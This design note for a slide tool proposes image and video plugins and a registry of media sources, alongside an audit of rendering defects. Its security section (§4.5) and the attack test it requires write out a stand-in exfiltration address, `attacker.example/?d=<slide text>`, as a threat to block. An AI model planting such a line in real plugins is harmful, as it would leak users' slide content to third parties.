---
status: proposed
summary: >
  Images and videos become two plugins, `image` and `video`, that any slide can use through Segno records
  (`@image{…}`, `@video{…}`), with Markdown's `![alt](src)` kept as the image's alias. Where the bytes come
  from is a separate, core concern: one registry of media sources (data, relative, file, web, sample, asset,
  later Google Drive) replaces the scheme checks repeated at nine
  sites across three core files. Video hosts stay one table of
  provider rows, extended with a `file` row for MP4 and WebM. The audit found nine defects in today's wiring. The two
  worst are confirmed by renders: a CLI export drops `![bg]` on an ordinary slide, and a relative image in slide
  text breaks in a CLI export written to another folder.
  Owner decisions: a clean break from Marp's alt-text keywords with an autofix, `>` as the video sigil, and remote
  sources fetched in the bake into a cache; packaging is on hold. After #2725, every address comes from the
  author's own block, never from slide text or the DOM (§4.5).
---

# Image and video plugins, and one registry of media sources (2026-10-16)

Status: proposed. The owner's decisions are in §8; packaging is on hold. Parents: `2026-09-27-plugin-system.md` (the plugin
contract), `2026-10-14-plugin-inline-door.md` (the `@kind{…}` form), `2026-09-28-segno-unified-inline-notation.md`
(the record grammar), `2026-10-12-library-media-assets.md` (the `asset:` namespace and the Library),
`2026-09-13-plugin-architecture.md` (the "T0 Provider" tier, whose first example was video providers).
Sibling: `2026-10-16-qr-plugin.md` (the `qr` plugin; the video figure's QR code becomes a call to its service).

## 1. The answer

There are two separate questions here, and today's code mixes them:

1. **What a slide shows**: an image or a video, where it sits on the slide, and how it is treated. This
   becomes two plugins, `image` and `video`, written as Segno records so they work on any slide.
2. **Where the bytes come from**: a pasted `data:` URI, a file beside the deck, a web address, Lattice's
   sample art, the Studio Library, and later Google Drive. This becomes one core registry of **media
   sources**. Both plugins read from it, and so do the `image`, `collage` and `video` slide classes.

The two axes are independent. `@video{asset:launch-demo}` is the `video` plugin reading the `asset` source.
`@image{https://drive.google.com/file/d/1AbC…}` is the `image` plugin reading a future Google Drive source, which
recognizes Drive's own address rather than a new scheme (§4.7). Adding a source never
touches a plugin, and adding a video host never touches a source.

Author syntax, as proposed:

```md
![Team offsite](asset:offsite)                       an image: CommonMark, kept as the image's alias
`@image{asset:offsite, alt="The team at the lake", caption="Offsite, 2026", nimbus}` the same image, with its text and a setting (§4.7)
`@video{https://youtu.be/dQw4w9WgXcQ?t=90, caption="The 90-second tour", poster=sample:photo-pano.jpg, muted}` a video on any slide, starting at 1:30
`>{https://youtu.be/dQw4w9WgXcQ}`                    the same video through its sigil (§8)
`@video{clips/demo.mp4}`                             a video file beside the deck (new: the `file` row)
```

A paragraph that holds only one media record renders as a block figure, the same way a lone `![…](…)` does
today. A record inside running text renders inline at text height, as an icon does.

## 2. What exists today

A read-only map of the pipeline, with every claim below checked against the source on 2026-10-16.

**Video is a slide layout, not something a slide can contain.** The only way to show a video is
`<!-- _class: video -->` with the URL as a list bullet (`lib/components/imagery/video/video.transform.js:16-19`).
Only the first matching URL is used. Every output (HTML, PDF, PPTX, PNG) gets the same markup: a poster tile
linked to the watch page, a play badge, "Watch on {label}" and, under `qr`, a QR code. Live playback exists only
in the docs-site preview, where the parent page mounts an iframe over the poster (`docs/src/playground/video-overlay.js`).

**The video hosts are already one table.** `PROVIDERS` in `lib/core/video-providers.mjs:85-158` holds one
descriptor per host (`key, label, hosts, id(url), watch, oembed, embed, shape, asyncResolve?`): YouTube,
Vimeo, TikTok and Instagram. Detection is a host lookup on a parsed URL, not a regex over the whole string,
and the render never touches the network. This is the strategy pattern already; the proposal extends it rather
than replacing it.

**Images use Markdown plus Marp's keywords in the alt text.** `![bg left](x)` is parsed by `BG_RE`
(`lib/core/bg-directive.js:30`) and by `installBackgroundImage` (`lib/engine/background-image.js:112-151`).
The `image` slide class lifts it into a `.lattice-bg` div (`lib/core/bg-image.js:172`); other slides get a
section background. `collage` reads `- ![Alt](path) \`hero, top, 3:2\`` list items.

**Sources are handled by scheme checks scattered across files:**

| Source | Written | Resolved by | Preview | Export |
|---|---|---|---|---|
| Embedded | `data:image/png;base64,…` | passes through | renders | renders |
| Relative path | `pic.jpg` | `resolveAssetUrl` (`bg-image.js:73`) against `baseUrl` | against the host's base | CLI lifts `![bg]` to `file://`; the player inlines `file://` as `data:` (`html-player.js:70-112`) |
| Absolute / `file:` | `/x/pic.jpg` | passes through | as written | inlined by `inlineFileUrls` |
| Web | `https://…` | `blockWebImages` (`remote-ref.js:527`) | a drawn hatch until the reader allows it | CLI: blocked unless `--allow-remote`; Studio player: fetched on opt-in, capped (`inline-url-media.mjs:132`) |
| Sample art | `sample:<name>` | `sampleName` (`remote-ref.js:67`) + `samplesUrl` | the site's staged copy | `file://` into `lib/samples/` |
| Library | `asset:<name>` | `assetName` (`remote-ref.js:82`) + the host's `assetUrls` map | `blob:` URL | `data:` URI (`media-urls.ts:160`); **CLI: unsupported** |

There is no source interface. `sample:` and `asset:` are regexes repeated in `bg-image.js:74,81,113,128-129`,
`background-image.js:93-94` and `remote-ref.js:55-56`. The host seams that do exist (`opts.assetUrls`,
`samplesUrl`, `baseUrl` on `engine.render`; `fetchDataUri` in `inlineUrlMedia`; `createAssetReader` in the PDF
writer) are the natural places for a registry to plug into.

**Nothing proposed an image or video plugin before this note.** The plugin-system note's list of future
plugins (§5) names neither. The only precedent is the "T0 Provider" tier in `2026-09-13-plugin-architecture.md`
(line 96), whose example was video providers, and its remark that "adding Loom or a bare `.mp4` is now a
one-row change" (lines 324-327).

## 3. Defects the audit found

| # | Defect | Evidence |
|---|---|---|
| D1 | **A relative image in slide text breaks in a CLI export written to another folder.** Chromium loads the page from the output path, and the CLI passes the engine `samplesUrl` but no `baseUrl` (`lattice.js:2178,2191`), so `![a](pic.jpg)` resolves against the output folder. `![bg]` is unaffected because the CLI lifts it to `file://` first | **Confirmed by render, 2026-10-16:** `deck/d.md` → `-o out/d.png` writes `out/d.001.png`, which shows a broken-image icon and the PDF writer reports "1 not-loaded"; the same deck rendered into `deck/` shows the picture. Logged as `followups.d/2727-p1-cli-relative-prose-image.md` |
| D2 | The `sample:` / `asset:` checks are repeated at nine sites across three core files (`bg-image.js`, `background-image.js`, `remote-ref.js`), plus more in the Studio's `asset:` helpers, so a new source means editing all of them, and the security predicate (`isRemoteUrl`) can drift from the resolver | §2 |
| D3 | **A CLI export drops `![bg]` on an ordinary slide entirely.** The CLI lifts `![bg]` into a `.lattice-bg` div on every slide (`liftBgImages`, `lattice.js:2170`), but every `.lattice-bg` rule is scoped to `section.image` (`image.styles.css:113`), so on any other slide the div has no size and paints nothing. The engine lifts only on `image` slides (`bg-image.js:172`) and paints the rest as a section background, so the Studio shows the picture. Two render paths, two results (HARD RULE #1) | **Confirmed on both surfaces, 2026-10-16:** the same two-slide deck (`![bg](sample:photo-pano.jpg)`, `![bg contain](sample:photo-tall-rotated.jpg)`) shows each picture in the real Studio (Playwright on the production build: section `background-size: contain`, 0 `.lattice-bg` divs) and a blank slide with only the heading in the CLI PNG. Logged as `followups.d/2727-p1-cli-drops-plain-slide-bg.md` |
| D4 | `bgDiv` drops `fit` / `contain` (`bgSide` keeps only left, right or full). On an `image` slide that does not show, because the `image` component picks its own composition from the picture's shape. On an ordinary slide in the CLI the picture is lost anyway (D3). So the keyword is honored only by the engine's section background | `bg-image.js:44-48,151` vs `background-image.js:39`; the CLI's `image` slide with a portrait picture and `contain` renders a matted portrait panel either way (CLI PNG, 2026-10-16) |
| D5 | Marp's `w:`, `h:`, filters (`blur`, `sepia`, …) and `bg left:40%` are not implemented. `![w:200](x)` renders a full-size image with "w:200" as its alt text; `bg left:40%` renders a full-bleed cover | no handler in `lib/`; `BG_RE` rejects `:` and `%` (checked with `node -e`) |
| D6 | `tools/fetch-video-oembed.js` writes a poster cache that no render reads, so the author copies the path into a `poster` bullet by hand | grep finds only a comment at `video-providers.mjs:71` |
| D7 | `asset:` names a Library video, but a slide cannot show one: it renders the missing-image stand-in | `2026-10-12-library-media-assets.md:8,639` |
| D8 | `IMG_SRC_RE` (`bg-image.js:94`) matches double-quoted `src` only; raw `<video src="asset:x">` and `srcset` are not resolved | `engine.render` with the Studio's `assetUrls` option, 2026-10-16: `<img src="asset:hero">` and `![md](asset:hero)` resolve to the mapped URL, `<img src='asset:hero'>` stays `asset:hero`. Also `followups.d/2640-p3-raw-html-asset-refs.md` |
| D9 | The PDF writer's asset reader accepts PNG and JPEG only (`pdf-asset-reader.js:23-29`). A WebP picture is not lost, but it stays in the page's background photo at the raster's resolution instead of being embedded as its original file | **Rendered, 2026-10-16:** the same picture as JPEG, PNG and WebP. JPEG and PNG print "1 images drawn as vectors or originals", and `pdfimages` lists the 3200×1200 original. WebP prints "0 … 1 left in the photo", and the PDF holds only the 2560×1440 page raster. GIF and AVIF are inferred from the same reader, not rendered |

D1 is pre-existing and off the path of this note, which is design only. It sits on the path of slice 1 (§7),
which fixes it.

## 4. The model

### 4.1 Media sources: one core registry

A **source** is one way of turning a reference into bytes. Each is a row in `lib/core/media-sources.js`, a
dependency-free leaf like `remote-ref.js` so the browser can load it as-is:

```js
{
  scheme: 'asset',                 // matched on the reference's scheme; null for relative paths
  parse(ref)    → id | null,       // pure; a malformed reference is null and is refused
  locality: 'local' | 'remote',    // remote = a beacon to a third party (HARD RULE #22)
  resolve(id, host) → url | null,  // sync, during the render; the host supplies what it needs
  materialize?(id, host) → bytes,  // async, in the bake pass, for sources a render cannot reach
  exportAs: 'inline' | 'copy' | 'link',  // what an export does with it
}
```

The rows: `data`, `relative`, `file`, `web`, `sample`, `asset`. `isRemoteUrl` is derived from the table's
`locality`, so the security predicate and the resolver can no longer disagree (D2). Each host supplies only the
`host` half: the Studio its IndexedDB map, the CLI the deck folder and `lib/samples/`, the desktop app its file
system. A source a host cannot serve resolves to the existing drawn stand-in, and `lint:deck` names it.

**Remote and slow sources materialize in the bake pass.** The plugin host already runs an async bake before
the synchronous render. A source with `materialize` (web, and later Google Drive, OneDrive, Dropbox or Unsplash, each recognized by its own
`https:` host)
fetches there, behind the same consent the web source has today, into a content-addressed cache keyed by
SHA-256. The render then sees a local reference. This one step also fixes the export duplication in
`followups.d/2640-p3-media-export-duplication.md`: one cached copy, referenced from every slide.

**A future source is a plugin contribution.** `contributes.sources` joins the manifest as a T0 provider:
declarative, so a source can ship from a zip plugin, with its fetch code in-tree or sandboxed. Google Drive
needs an OAuth token, which the desktop app and the Studio hold and the CLI does not; the row declares which
hosts can serve it, and the others show the stand-in.

### 4.2 The `image` plugin

- **The kind is `image`.** `` `@image{src, alt="…", caption="…", title="…", …}` `` is the full form. CommonMark's
  `![alt](src "title")` is its alias, the way `^{…}` is the icon's, and both fields mean what HTML means. Every editor, GitHub and every Markdown
  tool still shows the picture.
- **The record describes the picture; the layout places it.** It carries `alt`, `caption`, `title`, a focus hint
  and a treatment, and a relative size (`sm` / `md` / `lg`). Placement, fit and scrim belong to the layout it is written
  in (§4.7).
- **It owns** `bg-image.js`, `background-image.js`, `image-scrim`, `image-adaptive` and the `wrapImageText`
  pass. That ends the CLI/engine split (D3, D4): one lift, in the kernel both paths read.
- **The `image` and `collage` slide classes require the plugin**, as the `math` class requires `math`.
- **Images are not opt-in.** Unlike icons, `![…](…)` is CommonMark, so the plugin is a default plugin a
  host can still disable; a deck never has to list it.

### 4.3 The `video` plugin

- **The kind is `video`:** `` `@video{url, caption="…", poster=…}` ``. It renders the poster and play badge on any
  slide. The `video` slide class becomes a layout that requires the plugin, and it keeps its compositions
  (`companion`, `gallery`) and its `qr` variant, which asks the `qr` plugin for a code of the watch address and seats
  it beside the poster. A QR is a layout's choice, not a fact about the clip, so the record has no `qr` word; on
  another slide an author who wants one writes `@qr{…}` beside the video.
- **The provider table moves in, and grows a `via` field.** Today's four rows become `via: 'embed'`. A new
  `via: 'file'` row claims `.mp4`, `.webm` and `.mov` from any source (relative, `asset:`, web). That makes
  Library videos showable (D7) and gives the HTML player and the desktop app a real `<video>` element.
- **Per-surface output is the row's job, not the call site's:**

  | Surface | `embed` row | `file` row |
  |---|---|---|
  | PDF, PNG, PPTX | poster, badge (plus the code, on a `video qr` slide) | poster (the Library's captured one, or a first frame), badge |
  | HTML player, presenter | click-to-load iframe behind the web consent | `<video controls>` |
  | Studio preview | the existing overlay | `<video controls>` |

- **Posters resolve through a chain:** the author's `poster=`, then the Library record's poster, then the
  oEmbed cache (wiring the dead cache, D6), then the drawn stand-in. Each link is a media source, so a poster
  can come from anywhere an image can.
- **New hosts are rows.** Loom, Wistia and Google Drive video are each one descriptor. In-tree rows keep
  their `id(url)` functions; a zip plugin's row is declarative (hosts plus a Segno-compiled path pattern),
  because the Segno compiler already rejects any pattern that could backtrack.

### 4.4 What stays where

| Piece | Home | Why |
|---|---|---|
| Media sources registry, `isRemoteUrl` | core (`lib/core/media-sources.js`) | a security boundary every surface needs, with or without a plugin |
| Image placement, treatment, `@image` | `lib/plugins/image/` | owns the syntax; the slide classes require it |
| Video providers, `@video` | `lib/plugins/video/` | the T0 table plus the inline kind; a deck with no video loads none of it |
| `image`, `collage`, `video` slide classes | components, unchanged in place | layouts that compose the plugins |

### 4.5 The address comes only from the author's block (added 2026-10-16, after #2725)

**The attack.** A red team recorded it on 2026-10-12 (`lib/transformers/rebuilt-classes.js:4-11`), and
PR #2725 (`claude/plugin-inline-door-followups`) is closing it out: the built-in `video`, `qr` variant,
`contact` and `wifi` passes read a slide's text and turn any address they find into something the
viewer loads or scans (a poster link, a QR code). A zip plugin's output also lands on the slide as text. So a
plugin with no network of its own can write `https://attacker.example/?d=<the slide's text>` onto a video
slide, and Lattice's own pass publishes it. Today `lib/transformers/rebuilt-classes.js` stops this by
refusing to let a data plugin's fence draw on those slides (its consumer is `lib/packages/code-door.js`). The owner wants plugins to draw everywhere, which is safe
only if no code turns slide text into an address. These plugins are where that becomes true, so they follow
#2725's five rules:

1. **The address comes from the author's own block:** the `@video{…}` / `@image{…}` record or the
   `![alt](src)` token, read from the Markdown at render time. Never from slide text, never from the DOM.
2. **No plugin scans a slide.** No `textContent`, no walk over `<li>`s, no regex over a section's HTML in
   search of a URL. Today's `video` pass does all three (`video.transform.js` `resolvePayload` reads the
   rendered bullets, and `lib/transformers/video.js` runs it again over the finished DOM). The plugin does not
   copy it.
3. **A browser half touches only its own figure.** Poster painting and the preview overlay select
   `[data-lattice-figure="video"]` only, read the address from an attribute the renderer wrote, and skip
   anything inside `[data-lattice-plugin]`.
4. **Existing decks keep working.** A `<!-- _class: video -->` bullet URL is read from the author's bullet
   tokens in the engine, before any plugin draws. `lint:deck --fix` offers the `@video{…}` record in its
   place, the same migration as the Marp keywords (§8, decision 2).
5. **The old pass is deleted in the commit that replaces it**: its registry entry, its DOM half, and its row
   on #2725's `SANCTIONED_SLIDE_TEXT_ADDRESS_READERS` (that check and its allowlist are pending in #2725 and
   were not yet on its branch at `98a69d6`; if they land renamed, follow the landed names). The shadow list in `rebuilt-classes.js` is derived from
   the registry, so it shrinks on its own. These plugins never go on that allowlist: if
   `checkSlideTextAddressReaders` flags them, the code is wrong.

**What this note's own design had to change.** Three places in §4 would have rebuilt the attack:

- **The inline records, through the runtime mirror.** `transformInlinePills` (`lib/runtime/index.js:1115`)
  walks every `section code` in the finished page, plugin output included, and dispatches it. Icons, avatars
  and sparks draw no address, so that is harmless today. **Shown in the real Studio, 2026-10-16** (Playwright on
  the production build): a `<div data-lattice-plugin>` holding `<code>^{database}</code>`, appended to a painted
  slide, was redrawn as a `lat-icon` within 3 seconds. A plugin that writes `<code>@video{https://attacker…}</code>`
  would get a real poster link the same way. So an inline kind that carries an address declares it
  (`contributes.inline.video.address: true`), the runtime mirror never dispatches such a kind, and the mirror
  skips `[data-lattice-plugin]` for every kind. Address-bearing records resolve on the markdown-it token path
  only.
- **The image passes that run over rendered HTML.** `resolveInlineImageSrcs` (`IMG_SRC_RE`,
  `bg-image.js:94`), `liftImageBgImages` and `wrapImageText` read the section's HTML, plugin output included.
  They map only to local schemes today, so they leak nothing, but the `image` plugin moves them onto the
  image tokens or onto elements the engine stamped, never onto any `<img>` in the section. The web-image
  consent gate (`blockWebImages`) stays the last pass over the whole page, so even a plugin's own `<img>`
  cannot load a remote picture without the reader's consent.
- **The bake's remote fetch (§4.1).** `materialize` receives only the references the engine collected from
  tokens. It never scans rendered HTML for something to fetch.

**Evidence each slice owes (HARD RULE #23):** an attack test per plugin. A listed, approved zip plugin
renders `https://attacker.example/?d=<slide text>` as plain text on a slide that also carries the author's
video or image. Rendered in the real Studio and in a CLI export with a network log, it makes zero requests to
`attacker.example`, and the author's own media still shows.
`test/integration/export/plugin-fence-door.test.js` ("A SLIDE A SHIPPED PASS REBUILDS FROM ITS TEXT") keeps
its assertions and flips its expectation from "the plugin never drew" to "the plugin drew, nothing leaked".
Every committed deck that uses video or images renders the same before and after (golden-diff).

### 4.6 What each plugin ships beside its code (added 2026-10-16)

`image` and `video` ship the same set every shipped plugin carries (avatars, icons, math, mermaid, code):

| File or field | What it holds for these plugins |
|---|---|
| `<name>.docs.md` | The plain-language guide the docs site renders at `/plugins/<name>/`, in the shape of `avatars.docs.md`: the record and its alias, every option with a live example, the deck register, the sources an address can name (relative, `asset:`, `sample:`, web; Google Drive when it lands), the video hosts, what each export does (§4.3's table), accessibility (alt text, the poster's label), what stays literal, anti-patterns, and a short "where the address comes from" section stating §4.5 for authors |
| `<name>.fixtures.md` | The conformance cases `test/unit/plugins/conformance.test.js` runs: one `##` case per option and alias, plus the §4.5 cases (a plugin's `<code>@video{…}</code>` stays text; a bullet the author did not write never becomes a poster) |
| manifest `icon` | A drawn mark: a viewBox plus paths tagged `line`, `accent` or `fill`, which `lib/plugins/plugin-icon.mjs` turns into SVG and the theme colors. `image`: a frame with a hill and a sun. `video`: a frame with a play triangle. Drawn paths, never a typed `▶` (HARD RULE #29) |
| Docs site | the `/plugins/` index lists them. Its one-line description (`docs/src/pages/plugins/index.astro:20`) names the plugins by hand, so it gains "images, video" |
| `lib/plugins/README.md` | the "Shipped plugins" line gains both |
| Demo deck | `examples/<slug>.md`, one per plugin (HARD RULE #9) |

Each slice that ships a plugin ships its whole set; a plugin without its guide or icon is not done.

### 4.7 What each plugin carries, and what the layout decides (revised 2026-10-16)

**Two rules (owner, 2026-10-16).**

1. **A plugin describes the thing; the layout it sits in places it.** No record takes `left`, `right`, `bg`, a
   share like `40%`, `cover` / `contain` or `scrim`. The one exception is a relative size, `sm` / `md` / `lg`
   (below), which scales the thing inside the box the layout gave it and can never break out of that box. A record alone in a paragraph on a plain slide is a block
   figure the slide's own flow sizes; on an `image`, `split-panel`, `collage` or `video` slide, that layout seats it,
   and a layout that composes several plugins (a clip beside its QR code, a Wi-Fi card) owns that composition.
2. **A field's meaning and its name come from the standard that defines it.** Lattice coins a word only where the
   standard's spelling would significantly hurt understanding, and then the standard's name is accepted too. No
   field below is ours where a standard exists.

**The words every media record shares** come from HTML and Markdown, which already define a picture's text:

| Field | Meaning | Standard |
|---|---|---|
| the first item | the thing itself: an image or video address (any media source, §4.1) or a QR payload | the `src` of `<img>` / `<video>` |
| `alt="…"` | the text alternative a screen reader speaks, and what shows if the picture cannot | HTML `alt`; Markdown's `![alt](…)` |
| `caption="…"` | a visible line with the figure; the layout decides where | HTML `<figcaption>` |
| `title="…"` | advisory text, never on the slide face: shown on hover and tap on screen, the speaker note in print | HTML `title`; Markdown's `![…](src "title")` |

The Markdown alias carries three of them: `![alt](src "title")` is `@image{src, alt="alt", title="title"}`, exactly
as Markdown and HTML mean them. A media `title` plays the role #2723 calls a `description` on a chart (hidden detail,
hover and tap, the speaker note in print). The two keep their own standards' names; the guide says they are the same
role.

**What each plugin adds:**

| Plugin | Field | Meaning | Standard |
|---|---|---|---|
| `image` | `focus=top` (`bottom` `left` `right` `center`) | which part of the picture must stay in view when a layout crops it | the keywords of CSS `object-position` |
| | a treatment word | how the picture is set (below; open) | the deck's own finishes |
| `video` | `poster=` | the still that stands for the clip: a `sample:` or `asset:` picture, a path or a web picture. Omitted, the clip supplies its own: a Library video's captured poster, the host's thumbnail from the oEmbed cache (wiring D6), or a video file's first frame; failing all three, the drawn stand-in | HTML `<video poster>` |
| | `autoplay` | plays when the slide shows, on surfaces that play (HTML player, presenter, Studio); PDF and PowerPoint show the poster. A web-hosted clip autoplays only after the reader allowed web media (HARD RULE #22) | HTML `autoplay`; YouTube `autoplay`; Vimeo `autoplay` |
| | `muted` | starts without sound. Browsers allow `autoplay` only when muted, so `autoplay` implies it | HTML `muted`; Vimeo `muted` |
| | `loop` | starts again at the end | HTML `loop`; Vimeo `loop`; YouTube `loop` (limited in embeds) |
| | `controls` | `controls=false` hides the player's controls | HTML `controls`; YouTube `controls`; Vimeo `controls`; TikTok `controls` |
| | `fullscreen=false` | while presenting, the clip plays in its frame instead of filling the stage, which is the default (§4.8) | PowerPoint *Play Full Screen* (ECMA-376 `fullScrn`) |
| `qr` | the payload | a URI, quoted text, or a nested format record (`wifi={…}`, `contact={…}`) | URIs, the Wi-Fi URI, vCard (`2026-10-16-qr-plugin.md` §3, §3c) |
| | `c1` … `c12` | the code's ink, with a lint for scan contrast (owner, 2026-10-16) | the deck's color cycle |
| | `ec=L` `M` `Q` `H` | error correction | ISO/IEC 18004 |

Each video host row in the provider table maps these HTML names to the host's own parameters, and leaves out what a
host does not support (Instagram's embed takes none). The author writes HTML's word once; the row speaks the host's
dialect. That is the same strategy pattern as the hosts themselves.

**Considered and left out, because a standard already covers them or no host supports them:**

- **`start=`.** A start time is part of the address, as each standard defines it: `#t=90` for a video file (W3C Media
  Fragments), `?t=90` or `&start=90` on YouTube, `#t=90s` on Vimeo. The author writes the address they would share,
  and the poster link and QR open at that moment for free. (This reverses decision 7.)
- **`fullscreen` as a host setting.** No host offers "open full screen": YouTube's `fs=0` and TikTok's
  `fullscreen_button=0` only hide a button shown by default, and Vimeo follows the HTML `allowfullscreen` attribute.
  The plugin always sets `allowfullscreen`. The word does earn a place, but from the presentation standard (§4.8).
- **`gdrive:` and other invented schemes.** A Google Drive picture or clip has an `https://drive.google.com/…`
  address; a future source recognizes that host, as the video rows recognize theirs. `asset:` and `sample:` stay,
  because they name things no standard covers (a Studio Library item, Lattice's own sample art).
- **Placement and fit words, and absolute sizes** (rule 1; `sm` / `md` / `lg` are the only size words), **pixel sizes and filters** (Marp's keywords are retired, §8 decision 2),
  and **#2723's chart fields** (`size`, `kind`, `when`, `to`, `after`, `value`, `x`, `y`, `group`), which mean other
  things there.
- **`{> …}` inside a record.** In #2723 that form describes a table cell; a record names its `title`.

**Size: `sm`, `md`, `lg` (owner, 2026-10-16).** Images, video players and QR codes all take the same three words,
with `md` the default, the same words icons and avatars use. The layout still owns the box; the word scales the thing
inside it, within limits, so no choice can break a slide:

| Word | Scale against the layout's own size | Limit that wins |
|---|---|---|
| `sm` | about 80 % | never below a floor that keeps it legible: a QR code at least about a fifth of the slide's height, so a phone at the back of a room still reads it; a video poster large enough that its play badge and caption read; a photo at least about a quarter of the slide's width |
| `md` | 100 %, the layout's size | — |
| `lg` | about 120 % | never past the box the layout gave it, so it cannot overflow the slide or push text off it |

The steps are deliberately small: the three sizes read as a nudge, not three different layouts. The exact ratios and
floors are tuned on the demo decks, and the fit gate (`lint:deck`'s overflow check and the render's overflow warning)
must stay clean for `lg` on every layout that seats one. A deck sets a default once (`image: lg`); a record's word
wins.

**How a picture is styled: three separate controls (owner, 2026-10-16).** All three are off by default, and a deck
sets a default once through the `image:`, `video:` or `qr:` register, as `icon:` and `avatar:` work. A slide class
overrides the deck, and a record's own word wins.

1. **A frame**, shared by `image`, `video` and `qr`: `frame=mat`, `frame=keyline`, and so on. One frame system for all
   three, so a layout never draws its own frame around a picture, a clip or a code. The owner's bar is three to five
   designs, each boardroom-ready (10/10). Six candidates were rendered for the pick: `mat` (a gallery
   passe-partout), `keyline` (one accent hairline, offset), `float` (lifted on a soft shadow), `device` (a screen bezel,
   for product demos and video), `stack` (prints stacked on a table) and `corners` (registration brackets). A QR code's
   frame wraps its light paper tile, never the code itself, so the quiet zone and the contrast stay as ISO/IEC 18004
   requires (`2026-10-16-qr-plugin.md` §3c). **Kept (owner, 2026-10-16): `mat`, `keyline`, `float`, `device`,
   `corners`.** `stack` was left out as too casual for a boardroom.
2. **A finish on the picture**: the deck's own finishes applied to the photo's pixels as a light overlay, so a photo
   belongs to the deck's look. Only the finishes that suit a photograph qualify. Rendered candidates: `nimbus` (accent
   blooms, the owner's named pick), `halo` (a vignette with a lifted center) and `meridian` (a diagonal accent wash).
   `strata`'s bands and the line and pattern finishes (`ledger`, `savile`, `loom`, `atrium`) fight a photograph and
   are left out. Images take a finish; a video's poster takes the same one, so a clip matches the pictures beside it.
   **Kept (owner, 2026-10-16): `nimbus`, `halo`, `meridian`.**
   **Strength (owner, 2026-10-16): one lever, the scale slide finishes already use.** `backdrop:` takes `20` `40`
   `60` `80` `full` (`lib/base/base.registers.docs.md` §Restraining a finish), so a picture's finish takes the same
   words, written after the finish's name: `nimbus` alone is its default strength, `nimbus=40` is lighter, `nimbus=full`
   is the most it goes. Each finish carries a sensible default, tuned on the demo deck's real photographs; the
   prototype suggests `nimbus` 80 (it fades on bright photographs), `halo` 60 and `meridian` 60. The tones take the
   same lever (`duotone=60` is a partial wash; both default to `full`). A deck sets it once (`image: nimbus=40`), and a
   record's own word wins, as everywhere else. No other knob: a finish's colors come from the theme, never the record.
3. **A tone**: `duotone` (two palette colors) and `grayscale` (CSS's own filter name). Approved by the owner. Duotone
   needs its own colors in dark mode, where the first render washed out to a flat teal.

The words are the finish and frame names themselves (`@image{team.jpg, frame=mat, nimbus}`), because a finish name is
already Lattice's own vocabulary; no new names are coined for the same looks.

### 4.8 Playing a clip while presenting (added 2026-10-16)

**What presenting a clip is like today.** Present and Practice show the poster only; in-place playback was built
for the Studio and Playground and deferred for presenting (`2026-07-02-video-overlay-playback.md` §5). A presenter
who wants the room to see the clip clicks the poster, a new tab opens on the host's site, and they have left their
deck in front of the audience. That is the experience to fix.

**The presenting standard is PowerPoint's, so the words come from it.** A PowerPoint video carries playback
options, stored in the PPTX format (ECMA-376 PresentationML): *Start* (on click, or automatically), *Play Full Screen*
(`<p:video fullScrn="1">`), *Loop until Stopped*, *Rewind after Playing*, and *Hide While Not Playing*. Keynote offers
the same few. Lattice already exports PowerPoint, so these are the meanings a presenter brings with them.

| Record word | Presenting behavior | Standard |
|---|---|---|
| *(none)* | the clip waits on its poster; **the next advance plays it** (a clicker's forward button, →, Space, a tap), and the advance after that moves to the next slide | PowerPoint *Start: In Click Sequence*; Google Slides *Play (on click)* |
| `autoplay` | plays as the slide arrives | HTML `autoplay`; PowerPoint *Start: Automatically* |
| *(default)* / `fullscreen=false` | while it plays, the clip fills the stage; when it ends, or on Esc, or on the next advance, it shrinks back into the slide. `fullscreen=false` keeps it in its frame | PowerPoint *Play Full Screen* (`fullScrn`), with the default flipped (§8, decision 11) |
| `loop` | plays until the presenter advances | HTML `loop`; PowerPoint *Loop until Stopped* |
| `muted` | plays without sound | HTML `muted` |

**Why the next advance plays the clip.** A presenter holds a clicker with two buttons and stands away from the
laptop. A play button in the corner of a poster is out of reach, and a forward press that skips the clip loses it.
So on a slide with a clip, forward means "play" once, then "next slide", which is how PowerPoint's click sequence
behaves and what a presenter's hands already know. Back from a playing clip stops it and stays on the slide. The
same verbs reach every input (keyboard, clicker, wheel, touch), through the shared kernel
(`lib/core/present-transport.mjs`, `2026-08-10-input-verb-parity.md`).

**What `fullscreen` does, exactly.** The deck is already full screen when presenting, so the clip's frame grows to
fill the stage (the audience window), above the slide, and shrinks back after. It does not call the browser's
Fullscreen API: a page cannot put a host's cross-origin player full screen without a click inside that player, and it
would not need to. **It is on by default** (owner, 2026-10-16): a layout often shows the poster small, and a small
clip on a room's screen is hard to watch, so pressing play fills the stage. PowerPoint's default is off; Lattice keeps
PowerPoint's word and flips its default. `fullscreen=false` keeps a clip in the frame its layout gave it, which suits
a muted, looping clip used as motion behind a slide (`autoplay muted loop fullscreen=false`); a deck can turn the
default off once with the `video:` register.

**Two windows, one playback.** With the presenter console open, the clip plays on the audience window only; the
console shows its poster, elapsed and remaining time, and play / pause. Two embeds playing at once would mean two
soundtracks, so the console never plays its own.

**Where it applies.** Present, Practice and the HTML player play; the Studio preview plays in place as today. PDF
and PNG keep the poster and link. A future PowerPoint export that embeds clips writes these words as PowerPoint's
options (`fullscreen` → `fullScrn="1"`, `autoplay` → start automatically, `loop` → loop until stopped).

**The venue matters.** A web-hosted clip needs the room's network and the reader's web-media consent; an `asset:`
or file clip plays offline. Before presenting starts, a check (new work) names every clip that streams from a
host, so a presenter learns it before the audience does.

### 4.9 What the prototype taught, which the build owes (added 2026-10-16)

The pick was made from a throwaway prototype: inline CSS in a scratch deck, rendered by the CLI in `indaco` and
`cuoio`, light and dark, on two real photographs (a canoe on a lake; a red mug) and on Lattice's sample art. The
build turns it into the plugins' styles and owes these fixes, each seen in the renders:

- **`mat` in dark mode:** its drop shadow used the heading color, which is light on a dark theme, so it drew a pale
  glow under the mat. A frame's shadow is always dark, whatever the theme.
- **`float` in dark mode:** the accent-tinted shadow reads as a glow; tone it down for dark themes.
- **`mat` and `corners` cut the picture square,** overriding the base `section img` radius; `keyline`, `float` and
  `device` keep a rounded picture.
- **`device` around a QR code** puts its camera dot near the code. It is allowed, but no guide example shows it.
- **`nimbus` on a bright photograph nearly vanishes,** because its blooms lighten (a screen blend) and a bright sky is
  already light. It shows on a darker photo. The build finds a blend that reads on both, measured on a light and a
  dark photograph, without hiding the subject.
- **`duotone` in dark mode** needs dark shadows of its own; the first render washed out to a flat teal, and a deeper
  shadow color fixed it.
- **Sizes are relative to the frame** (padding in percent, with a floor in `em`), so a frame looks the same around a
  small poster and a full-width photo.

Each plugin's demo deck (HARD RULE #9) shows every frame and finish on a real photograph, in light and dark, and the
QUALITY BAR's visual review runs on it before merge.

